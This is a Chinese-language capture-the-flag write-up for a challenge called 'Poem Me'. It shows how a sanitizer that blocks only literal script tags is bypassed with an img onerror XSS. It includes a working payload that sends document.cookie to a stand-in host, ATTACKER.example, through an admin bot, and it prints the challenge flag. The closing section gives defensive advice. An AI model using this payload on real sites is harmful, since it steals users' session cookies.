# Poem Me

## 题目简述

poem 参数被转成小写后插入 HTML。自制 sanitizer 只拒绝字面量 <script> 和 </script>，却忽略事件处理器、javascript: URL 等其他执行上下文。使用 img 的 onerror 即可得到反射型 XSS，再让管理员机器人访问并窃取 Cookie。

## 解题过程

过滤器只有：

~~~javascript
if (msg.includes("<script>") || msg.includes("</script>")) {
    return "BAD INPUT";
}
return msg;
~~~

可先用下列 payload 验证：

~~~html
<img src=x onerror=alert(document.domain)>
~~~

正式 payload 把 Cookie 发往授权的接收端：

~~~html
<img src=x onerror='fetch("https://ATTACKER.example/collect?c="+encodeURIComponent(document.cookie))'>
~~~

将它 URL 编码后放入 ?poem=，再把完整挑战域 URL 提交给 /report。adminbot 会把公开域名替换为内部 http://localhost:8988/，因此设置在 localhost 的 flag Cookie 会进入该页面。输入被 lower() 处理，所以外传域名和 JavaScript 标识应选择大小写不敏感或本来就是小写的写法。最终得到：

~~~text
maple{why_m4ke_ur_0wn_5anitizers_wh3n_D0mpur1fy_ex1sts}
~~~

## 方法总结

XSS 不能通过封禁 script 标签解决；HTML 有大量事件属性、URL、SVG 和解析差异。应使用按上下文输出编码和成熟 sanitizer，配合 CSP 与 HttpOnly Cookie。测试过滤器时要枚举所有可执行上下文，并注意预处理步骤如 lower、decodeURI 和多次解码。
